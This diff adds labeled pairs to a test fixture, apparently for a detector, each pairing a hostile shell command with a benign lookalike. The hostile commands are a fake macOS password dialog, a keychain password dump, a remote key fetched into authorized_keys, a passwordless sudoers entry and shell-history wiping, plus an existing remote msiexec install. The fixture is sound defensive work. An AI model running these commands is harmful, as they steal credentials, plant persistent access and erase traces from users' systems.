@@ -440,6 +440,32 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             b"msiexec /i https://example.invalid/inert.msi /qn\n",
             b"msiexec /i C:\\installers\\inert.msi /qn\n",
         ),
+        (
+            "macos_password_prompt",
+            b'osascript -e \'display dialog "macOS needs your password to continue" '
+            b'default answer "" with hidden answer\'\n',
+            b'osascript -e \'display dialog "Project name?" default answer ""\'\n',
+        ),
+        (
+            "macos_keychain_dump",
+            b"security find-generic-password -ga Chrome\n",
+            b"security find-generic-password -s Chrome\n",
+        ),
+        (
+            "unix_privilege_persistence",
+            b"curl -s https://example.invalid/k >> ~/.ssh/authorized_keys\n",
+            b"cat id_ed25519.pub >> ~/.ssh/authorized_keys\n",
+        ),
+        (
+            "unix_privilege_persistence",
+            b'echo "$USER ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers\n',
+            b"sudo visudo\n",
+        ),
+        (
+            "unix_privilege_persistence",
+            b"unset HISTFILE; history -c; rm -f ~/.bash_history\n",
+            b"history | tail -20\n",
+        ),
     ]
 
 
